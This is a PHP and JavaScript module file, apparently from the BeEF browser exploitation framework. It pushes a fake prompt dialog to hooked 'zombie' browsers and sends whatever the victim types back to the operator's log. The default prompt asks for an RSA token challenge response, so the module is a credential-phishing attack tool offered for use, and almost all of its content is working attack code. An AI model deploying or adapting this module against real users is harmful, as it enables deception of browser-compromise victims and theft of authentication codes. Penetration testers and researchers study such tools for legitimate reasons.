<?
	// Copyright (c) 2006-2009, Wade Alcorn 
	// All Rights Reserved
	// wade@bindshell.net - http://www.bindshell.net

	require_once("../../../include/common.inc.php"); // included for get_b64_file()
	DEFINE('JS_FILE', './template.js');
?>

<script>

	get_b64_code_prompt = function () {
		// javascript is loaded from a file - it could be hard coded
		var b64code = '<? echo get_b64_file(JS_FILE); ?>';

		// replace sections of the code with user input
		b64code = b64replace(b64code, "PROMPTSTRING", document.myform.prompt_str.value);
		
		return b64code;
	}

	Element.Methods.set_autorun = function() {
		ar.enable('Prompt Dialog', get_b64_code_prompt());
	}
	
	Element.Methods.send_now = function() {
		do_send(get_b64_code_prompt());
	}

	// add construct code to DOM
	Element.addMethods();
</script>

<!-- PAGE CONTENT -->
<div id="module_header">Prompt Dialog</div>
This module will display a prompt dialog in the zombie browser requesting the user for 
information. The entered information will be returned in the log.<br><br>
<div id="module_subsection">
	<form name="myform">
		<div id="module_subsection_header">Prompt String</div>
		<input type="text" width="90%" name="prompt_str" value="Please enter RSA response for challenge : 000000"/>
		<input class="button" type="button" value=" Set Autorun " onClick="javascript:set_autorun()"/>
		<input class="button" type="button" value=" Send Now " onClick="javascript:send_now()"/>
	</form>
</div>
